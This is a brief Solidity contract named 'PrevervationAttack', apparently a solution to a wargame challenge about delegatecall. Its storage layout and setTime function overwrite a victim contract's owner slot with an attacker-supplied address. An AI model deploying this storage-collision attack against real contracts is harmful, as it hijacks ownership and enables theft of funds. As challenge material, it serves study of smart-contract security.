// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PrevervationAttack{
    address nouse1;
    address nouse2;
    address fakeOwner;

    function setTime(uint _time) public {
        fakeOwner = address(uint160(_time));
    }
}

